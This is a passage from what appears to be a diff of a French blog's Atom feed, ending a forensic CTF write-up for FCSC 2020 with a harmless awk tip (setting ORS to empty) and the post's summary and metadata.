+<ul>
+  <li>Et enfin, je supprime l’<em>output record separator</em> (par défaut : \n) pour avoir tous les caractères sur une seule ligne :</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="go">ORS=''</span></code></pre></figure>
+
+<p>C’était finalement pas si compliqué, j’aurai même gagné du temps je pense…</p>]]></content><author><name>Vixepti</name></author><category term="writeup" /><category term="FCSC" /><category term="ctf" /><category term="writeup" /><category term="forensic" /><summary type="html"><![CDATA[J’ai pas mal hésité à publier ce writeup ainsi que celui pour le challenge Petite frappe 2, parce que j’ai flag vraiment salement. Mais finalement je publie avec pour objectif d’apporter une amélioration dans les prochains jours pour faire ça plus proprement. Ça soulagera ma conscience.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/2020/05/FCSC.png" /><media:content medium="image" url="http://localhost:4000/assets/2020/05/FCSC.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
